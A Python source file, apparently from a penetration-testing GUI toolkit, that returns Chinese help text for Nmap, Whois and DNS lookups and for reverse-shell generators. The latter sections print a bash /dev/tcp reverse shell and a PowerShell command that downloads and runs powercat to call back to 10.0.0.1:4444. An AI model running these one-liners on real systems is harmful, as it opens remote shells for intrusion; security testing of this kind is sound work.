#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "unihonest"
__license__ = "GNU General Public License v3.0"

import re

def normalize_spaces(text):
    # 使用正则表达式替换一个或多个空格为单个空格
    # \s 表示任何空白字符，包括空格、制表符、换页符等等
    # + 表示前面的字符出现一次或多次
    # 我们添加 [^\S\n] 以确保只匹配非换行的空白字符
    return re.sub(r'[^\S\n]+', ' ', text)


# 工具的使用文档
def get_tool_txt(value):
    if value == "Nmap":
        tool_txt = f''' nmap 功能需在本地安装 nmap 软件。\n
            下载: https://nmap.org/download\n
            校验 hash: https://nmap.org/dist/sigs/\n\n
            举🌰: \n
            输入框1: localhost\n
            输入框2: -Pn -sS -sV -O -T3 -p22,80,443,3389
        '''
        return normalize_spaces(tool_txt)
    
    elif value == "Whois":
        tool_txt = f''' 使用whois查询时, 需根据是否返回\"refer\"字段，更换 whois 服务器。\n\n
            举🌰: \n
            输入框1: unihonest.github.io\n
            输入框2: whois.iana.org
        '''
        return normalize_spaces(tool_txt)

    elif value == "DNS-type":
        tool_txt = f''' 使用dnspython查询DNS的各种记录类型。以下为查询列表: \n
            ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA', 'PTR', 'SRV', 'CAA', 'TLSA', 'SSHFP']\n\n
            举🌰: \n
            输入框1: unihonest.github.io\n
            输入框2: 8.8.8.8\n\n
            也可以在Command执行如下命令：\n
            nslookup unihonest.github.io\n
            nslookup -type=A unihonest.github.io\n
            nslookup -query=any unihonest.github.io\n
            nslookup unihonest.github.io 8.8.8.8\n
        '''
        return normalize_spaces(tool_txt)
    
    elif value == "反弹_bash":
        tool_txt = f''' 生成反弹shell - bash类型\n\n
            举🌰: \n
            输入框1: 10.0.0.1\n
            输入框2: 4444\n
            结果: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
        '''
        return normalize_spaces(tool_txt)
    
    elif value == "反弹_powershell":
        tool_txt = f''' 生成反弹shell - powershell类型\n\n
            举🌰: \n
            输入框1: 10.0.0.1\n
            输入框2: 4444\n
            结果: powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 10.0.0.1 -p 4444 -e cmd
        '''
        return normalize_spaces(tool_txt)
    
    elif value == "java_lang_Runtime_exec":
        tool_txt = f''' java.lang.Runtime.exec() Payload Workarounds\n\n
            举🌰: \n
            输入框1: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n
            输入框2: bash、powershell、python、perl
        '''
        return normalize_spaces(tool_txt)